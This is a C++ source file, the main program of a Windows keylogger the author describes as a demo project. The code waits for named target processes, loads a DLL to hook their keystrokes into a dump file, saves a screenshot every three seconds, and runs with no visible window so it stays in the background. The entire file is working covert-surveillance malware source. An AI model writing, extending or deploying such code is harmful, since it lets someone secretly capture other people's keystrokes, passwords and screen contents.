/**@file main.cpp
 *
 * This is part of keylogger, demo project to hook key event of a process
 * and do periodic screenshot of screen.
 *
 * @author Oky Firmansyah <mail@okyfirmansyah.net>.
 *
 * @date Created      : Apr 03, 2017 okyfirmansyah
 */

#include <tchar.h>
#include <windows.h>
#include <winbase.h>
#include <string>
#include <thread>
#include <atomic>
#include "log.h"
#include "util.h"

using namespace std;

#if defined(UNICODE) && !defined(_UNICODE)
    #define _UNICODE
#elif defined(_UNICODE) && !defined(UNICODE)
    #define UNICODE
#endif

/// hardcoded for now
static const char* dllName="keyloggerDll.dll";
static const char* targetKeyLogFile="C:\\src\\keydump.txt";
static const char* targetScrShotPath="C:\\src\\";
static const char* targetLogFile="log.txt";

/** get parameter arguments, if number of parameter is less than 1, return false
  * parameter 1 will be keyLogProc, parameter 2 will be scrShotProc.
  * If there is no parameter 2, then scrShotProc will take parameter 1.
  */
bool getProcessNameArgs(LPSTR lpszArgument, string& keyLogProc, string& scrShotProc)
{
    keyLogProc="";
    scrShotProc="";

    while((lpszArgument[0]!='\0')&&(lpszArgument[0]!=' '))
    {
        keyLogProc+=*lpszArgument++;
    }

    //skip space
    while(lpszArgument[0]==' ')lpszArgument++;

    while((lpszArgument[0]!='\0')&&(lpszArgument[0]!=' '))
    {
        scrShotProc+=*lpszArgument++;
    }

    if(keyLogProc.length()==0)return false;
    if(scrShotProc.length()==0)scrShotProc=keyLogProc;

    return true;
}

/** Main thread routine for handling keylogging process
 */
void waitForKeyLogProc(const string &procName)
{
    logInfo("Waiting for keylog target process: ", procName,"...");
    while(!findFirstProcess(procName,[](PROCESSENTRY32*entry)
    {
        HWND hwnd=getHwndFromProcessId(entry->th32ProcessID);
        if(hwnd)
        {
             DWORD threadId=GetWindowThreadProcessId(
                              hwnd,NULL);

             // inject thread Id here
             HINSTANCE hinst = LoadLibrary(dllName);

             if (hinst) {
                typedef void (*Install)(unsigned long, const char*);

                Install install = (Install) GetProcAddress(hinst, "install");

                install(threadId, targetKeyLogFile);
                logInfo("Keylog target process is found and injected..");

                atomic<bool> already_dead(false);

                // mini watcher subthread(communicate via alread_dead flag)
                std::thread watcher([&already_dead, &entry](void)
                {
                    while(already_dead==false)
                    {
                        DWORD exitCode;
                        HANDLE hnd=OpenProcess(PROCESS_QUERY_INFORMATION , TRUE, entry->th32ProcessID);
                        GetExitCodeProcess(hnd,&exitCode);
                        if(exitCode!=STILL_ACTIVE)
                            already_dead=true;
                        else
                            Sleep(500);
                    }
                });

                // lets sit down and relax waiting for
                // target process to terminate..
                while(!already_dead)
                    Sleep(1);

                watcher.join();

                logInfo("Target keylogging process is already terminated, ending keylogging..");
             }else
               logError("Unable to load DLL library!");
        }
    })) Sleep(1000);

}


/** Main thread routine for handling screenshot process routine
 */
void waitForScrShotProc(const string &procName)
{
    logInfo("Waiting for screenshot target process: ", procName,"...");
    while(!findFirstProcess(procName))
        Sleep(1000);
    logInfo("Target screenshot process found, begin taking screenshots...");

    // taking screenshot here
    while(findFirstProcess(procName))
    {
        if(takeScreenShot(targetScrShotPath))
            logInfo("Screenshot taken!");
        else
            logError("Failed to take screenshot!");

        //yeah, this is not accurate 3s period because
        //saving time overhead is not take into account(can use std::chrono in future)
        Sleep(3000);
    }

    logInfo("target screenshot process terminated, stop taking screenshots");
}

/** Main entry.
  * This is windows-styled main entry but no actual windows handling, so to
  * make it active only in backround
  */
int WINAPI WinMain (HINSTANCE hThisInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR lpszArgument,
                     int nCmdShow)
{
    logInit(targetLogFile);


    logInfo("KeyLogger Alpha v0.0.1 started...");

    string keyLogProc;
    string scrShotProc;

    if(!getProcessNameArgs(lpszArgument, keyLogProc, scrShotProc))
    {
        logError("Insufficient argument supplied, halting..");
        return 1;
    }

    std::thread t1(waitForKeyLogProc, keyLogProc);
    std::thread t2(waitForScrShotProc, scrShotProc);


    t1.join();
    t2.join();

    logInfo("KeyLogger terminated.");

    return 0;
}
